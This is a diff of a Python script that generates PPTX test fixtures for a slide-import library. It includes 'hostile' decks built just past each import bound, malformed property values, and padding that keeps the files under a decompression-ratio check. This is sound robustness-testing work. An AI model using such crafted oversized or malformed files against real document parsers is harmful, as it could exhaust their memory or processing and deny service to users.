+              ("ui8", "8"), ("uint", "9"), ("r4", "1.5"), ("r8", "NaN"), ("decimal", "1.25"), ("lpstr", "a"), ("bstr", "b"), ("date", "2020-01-02T03:04:05Z"),
+              ("filetime", "2020-01-02T03:04:05Z"), ("bool", "true"), ("cy", "1.2500"), ("error", "0x80000000"), ("clsid", FMTID), ("blob", "QUJD"), ("oblob", "QUJD"),
+              ("stream", "QUJD"), ("ostream", "QUJD"), ("storage", "QUJD"), ("ostorage", "QUJD")]
+    props = [f'<property fmtid="{FMTID}" pid="{i + 2}" name="{t}"><vt:{t}>{v}</vt:{t}></property>' for i, (t, v) in enumerate(values)]
+    n = len(values) + 2
+    props += [f'<property fmtid="{FMTID}" pid="{n}" name="empty"><vt:empty/></property>',
+              f'<property fmtid="{FMTID}" pid="{n + 1}" name="null"><vt:null/></property>',
+              f'<property fmtid="{FMTID}" pid="{n + 2}" name="vstream"><vt:vstream version="{FMTID}">QUJD</vt:vstream></property>',
+              f'<property fmtid="{FMTID}" pid="{n + 3}" name="vec" linkTarget="rng"><vt:vector size="2" baseType="i4"><vt:i4>1</vt:i4><vt:i4>2</vt:i4></vt:vector></property>',
+              f'<property fmtid="{FMTID}" pid="{n + 4}" name="arr"><vt:array lBounds="0" uBounds="1" baseType="bool"><vt:bool>0</vt:bool><vt:bool>1</vt:bool></vt:array></property>']
+    custom = f'{DECL}<Properties {CP_NS}>\n  ' + "\n  ".join(props) + '\n</Properties>\n'
+    return dict(presentation=presentation, core=core, app=app, custom=custom, pres_props=pres_props, view_props=view_props)
+
+
+STRICT_URIS = [("http://schemas.openxmlformats.org/presentationml/2006/main", "http://purl.oclc.org/ooxml/presentationml/main"),
+               ("http://schemas.openxmlformats.org/drawingml/2006/main", "http://purl.oclc.org/ooxml/drawingml/main"),
+               ("http://schemas.openxmlformats.org/officeDocument/2006/extended-properties", "http://purl.oclc.org/ooxml/officeDocument/extendedProperties"),
+               ("http://schemas.openxmlformats.org/officeDocument/2006/custom-properties", "http://purl.oclc.org/ooxml/officeDocument/customProperties"),
+               ("http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes", "http://purl.oclc.org/ooxml/officeDocument/docPropsVTypes"),
+               ("relationships/extended-properties", "relationships/extendedProperties"),
+               ("relationships/custom-properties", "relationships/customProperties"),
+               ("http://schemas.openxmlformats.org/officeDocument/2006/relationships", "http://purl.oclc.org/ooxml/officeDocument/relationships")]
+
+
+def strict_deck():
+    out = []
+    for name, data in full_deck(**rich_parts()):
+        if isinstance(data, str):
+            for old, new in STRICT_URIS:
+                data = data.replace(old, new)
+            data = data.replace('conformance="transitional"', 'conformance="strict"').replace('sz="15620"', 'sz="15.62%"')
+        out.append((name, data))
+    return out
+
+
+def seeded(unit, count):
+    """`count` copies of `unit`, broken by a comment often enough to stay under the
+    expansion ratio that would otherwise refuse the file before the bound under test."""
+    block = []
+    for i in range(0, count, 400):
+        tag = hashlib.sha256(str(i).encode()).hexdigest()
+        block.append(f"<!--{tag}-->" + unit * min(400, count - i))
+    return "".join(block)
+
+
+def property_fixtures():
+    yield "generated/rich-properties.pptx", zipped(full_deck(**rich_parts())), "open"
+    yield "generated/strict-properties.pptx", zipped(strict_deck()), "open"
+    # One per bound in ImportLimits. Each opens: only import counts these. The code each
+    # must produce is in crates/casual-slide-import/tests/hostile_values.rs.
+    def main_with(tag, unit, count):
+        return dict(presentation=f"{DECL}<p:presentation {NS}><p:{tag}>" + seeded(unit, count) + f"</p:{tag}></p:presentation>")
+
+    show = '<p:custShow name="s" id="1"><p:sldLst>' + seeded('<p:sld r:id="rId3"/>', 500_001) + "</p:sldLst></p:custShow>"
+    guides = "<p:guideLst>" + seeded("<p:guide/>", 65_537) + "</p:guideLst>"
+    vector = '<vt:vector size="1" baseType="i4">' + seeded("<vt:i4>1</vt:i4>", 1_000_001) + "</vt:vector>"
+    long_title = ("x" * 8191 + "y") * ((16 << 20) // 8192) + hostile_noise()
+    limits = {
+        "slides": main_with("sldIdLst", '<p:sldId id="256" r:id="rId3"/>', 100_001),
+        "masters": main_with("sldMasterIdLst", '<p:sldMasterId r:id="rId1"/>', 10_001),
+        "custom-shows": main_with("custShowLst", '<p:custShow name="s" id="1"/>', 10_001),
+        "show-slides": dict(presentation=f"{DECL}<p:presentation {NS}><p:custShowLst>{show}</p:custShowLst></p:presentation>"),
+        "fonts": main_with("embeddedFontLst", "<p:embeddedFont/>", 4_097),
+        "customer-data": main_with("custDataLst", '<p:custData r:id="rId10"/>', 100_001),
+        "guides": dict(presentation=pres_doc(), view_props=f"{DECL}<p:viewPr {NS}><p:slideViewPr><p:cSldViewPr>{guides}</p:cSldViewPr></p:slideViewPr></p:viewPr>"),
+        "custom-properties": dict(presentation=pres_doc(), custom=f"{DECL}<Properties {CP_NS}>" + seeded("<property/>", 100_001) + "</Properties>"),
+        "keywords": dict(presentation=pres_doc(), core=f"{DECL}<cp:coreProperties {CORE_NS}><cp:keywords>" + seeded("<cp:value>k</cp:value>", 100_001) + "</cp:keywords></cp:coreProperties>"),
+        "variant-items": dict(presentation=pres_doc(), custom=f'{DECL}<Properties {CP_NS}><property fmtid="{FMTID}" pid="2">{vector}</property></Properties>'),
+        "variant-depth": dict(presentation=pres_doc(), custom=f'{DECL}<Properties {CP_NS}><property fmtid="{FMTID}" pid="2">' + "<vt:variant>" * 40 + "<vt:null/>" + "</vt:variant>" * 40 + "</property></Properties>"),
+        "value-bytes": dict(presentation=pres_doc(), core=f"{DECL}<cp:coreProperties {CORE_NS}><dc:title>{long_title}</dc:title></cp:coreProperties>"),
+    }
+    for name, parts in limits.items():
+        yield f"hostile/import-limit-{name}.bin", zipped(full_deck(**parts)), "open"
+    # Over the bound on findings: distinct unknown elements, a report that must not grow without end.
+    flood = "".join(f"<z{i}/>" for i in range(10_100))
+    yield "hostile/import-findings-flood.bin", zipped(full_deck(pres_doc(f"<p:extLst/>{flood}"))), "open"
+    # Values that must be reported and left out, never coerced and never a panic.
+    yield "hostile/import-bad-values.bin", zipped(full_deck(**bad_values())), "open"
+
+
+def hostile_noise():
+    # A single value of 16 MiB compresses past the ratio bound unless part of it does not.
+    return "".join(hashlib.sha256(str(i).encode()).hexdigest() for i in range(1024))
+
+
+def bad_values():
+    presentation = (
+        f'{DECL}<p:presentation {NS} serverZoom="lots" firstSlideNum="99999999999999999999" rtl="maybe" bookmarkIdSeed="0" conformance="loose" compatMode="">'
+        '<p:sldMasterIdLst><p:sldMasterId id="5" r:id="rId1"/><p:sldMasterId id="NaN" r:id="rId1"/></p:sldMasterIdLst>'
+        '<p:sldIdLst><p:sldId id="4294967295" r:id="rId3"/><p:sldId id="5" r:id="rId4"/><p:sldId id="256" r:id="rId999"/><p:sldId id="256" r:id="rId1"/>'
+        '<p:sldId id="-1" r:id="rId5"/><p:sldId id="4294967296" r:id="rId5"/><p:sldId r:id="rId5"/><p:sldId id="300"/></p:sldIdLst>'
+        '<p:sldSz cx="1" cy="99999999999" type="poster"/><p:notesSz cx="-1" cy="1e9"/>'
+        '<p:embeddedFontLst><p:embeddedFont/><p:embeddedFont><p:font typeface="F" panose="zz" pitchFamily="999" charset="1000"/><p:regular r:id="rId2"/></p:embeddedFont></p:embeddedFontLst>'
+        '<p:custShowLst><p:custShow name="s"/><p:custShow id="1" name="a"><p:sldLst><p:sld r:id="rId2"/></p:sldLst></p:custShow><p:custShow id="1" name="b"/></p:custShowLst>'
+        '<p:photoAlbum layout="9pic" frame=""/><p:kinsoku lang="x"/><p:modifyVerifier spinCount="-3" cryptProviderType="rot13"/>'
+        '<p:sldSz cx="914400" cy="914400"/></p:presentation>')
+    pres_props = (f'{DECL}<p:presentationPr {NS}><p:webPr imgSz="1x1" clr="puce"/><p:prnPr prnWhat="all" clrMode="sepia"/>'
+                  '<p:showPr loop="2"><p:kiosk restart="-1"/><p:browse/><p:sldRg st="9" end="1"/><p:custShow id="777"/></p:showPr>'
+                  '<p:htmlPubPr r:id="rId404"><p:sldRg st="1" end="4000000000"/></p:htmlPubPr></p:presentationPr>')
+    view_props = (f'{DECL}<p:viewPr {NS} lastView="nope" showComments="2"><p:normalViewPr vertBarState="z"><p:restoredLeft sz="200000"/><p:restoredTop/></p:normalViewPr>'
+                  '<p:slideViewPr><p:cSldViewPr><p:cViewPr><p:scale><a:sx n="x" d="1"/></p:scale><p:origin x="1e400in" y="99999999999999999999"/></p:cViewPr>'
+                  '<p:guideLst><p:guide pos="99999999999"/><p:guide orient="diag" pos="1zz"/></p:guideLst></p:cSldViewPr></p:slideViewPr>'
+                  '<p:outlineViewPr><p:cViewPr/><p:sldLst><p:sld r:id="rId404"/><p:sld/></p:sldLst></p:outlineViewPr><p:gridSpacing cx="-5" cy="5"/></p:viewPr>')
+    core = (f'{DECL}<cp:coreProperties {CORE_NS}><dc:title><b>no</b></dc:title><dc:title>second</dc:title><dcterms:created>yesterday</dcterms:created>'
+            '<dcterms:modified xsi:type="dcterms:W3CDTF">2021-02-30T25:00:00Z</dcterms:modified><cp:lastPrinted>0</cp:lastPrinted>'
+            '<title>no namespace</title></cp:coreProperties>')
+    app = (f'{DECL}<Properties {EP_NS}><Slides>many</Slides><Notes>99999999999</Notes><ScaleCrop>2</ScaleCrop>'
+           '<TitlesOfParts><vt:vector size="4294967295" baseType="lpstr"><vt:lpstr>a</vt:lpstr></vt:vector></TitlesOfParts>'
+           '<HeadingPairs><vt:vector size="zero" baseType="wat"><vt:i4>x</vt:i4></vt:vector></HeadingPairs><HLinks/><DigSig/></Properties>')
+    custom = (f'{DECL}<Properties {CP_NS}><property/><property fmtid="nope" pid="2"/><property fmtid="{FMTID}" pid="x"/>'
+              f'<property fmtid="{FMTID}" pid="1"/><property fmtid="{FMTID}" pid="3"><vt:r8>inf</vt:r8></property>'
+              f'<property fmtid="{FMTID}" pid="3"><vt:i1>128</vt:i1></property><property fmtid="{FMTID}" pid="4"><vt:cy>1.5</vt:cy></property>'
+              f'<property fmtid="{FMTID}" pid="5"><vt:date>not a date</vt:date></property><property fmtid="{FMTID}" pid="6"><vt:blob>!!!</vt:blob></property>'
+              f'<property fmtid="{FMTID}" pid="7"><vt:array lBounds="a" uBounds="1" baseType="i4"/></property><property fmtid="{FMTID}" pid="8"><vt:wat/></property></Properties>')
+    return dict(presentation=presentation, core=core, app=app, custom=custom, pres_props=pres_props, view_props=view_props)
+
+
+def check():
+    """Committed bytes against the manifest. Deliberately not a regeneration, since
+    deflate output can differ between zlib versions."""
+    rows = [ln.split("\t") for ln in (ROOT / "manifest.tsv").read_text().splitlines()[1:]]
+    listed = {r[0] for r in rows}
+    bad = [r[0] for r in rows if not (ROOT / r[0]).exists() or hashlib.sha256((ROOT / r[0]).read_bytes()).hexdigest() != r[1]]
+    stray = [str(p.relative_to(ROOT)) for d in ("generated", "hostile", "producers") for p in (ROOT / d).glob("*") if str(p.relative_to(ROOT)) not in listed and p.name != "expect.tsv"]
+    if bad or stray:
+        raise SystemExit(f"fixtures differ from manifest: {bad} unlisted: {stray}")
+    print(f"fixtures match manifest: {len(rows)}")
+
+
+def main():
+    if "--check" in sys.argv:
+        check()
+        return
+    lines = ["path\tsha256\texpect\n"]
+    for rel, data, expect in fixtures():
+        path = ROOT / rel
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_bytes(data)
+        lines.append(f"{rel}\t{hashlib.sha256(data).hexdigest()}\t{expect}\n")
+    # Decks written by other software are committed, never regenerated.
+    for row in (ROOT / "producers/expect.tsv").read_text().splitlines():
+        name, expect = row.split("\t")
+        rel = f"producers/{name}"
+        lines.append(f"{rel}\t{hashlib.sha256((ROOT / rel).read_bytes()).hexdigest()}\t{expect}\n")
+    (ROOT / "manifest.tsv").write_text("".join(lines))
+    print(f"wrote {len(lines) - 1} fixtures")
+
+
+if __name__ == "__main__":
+    main()
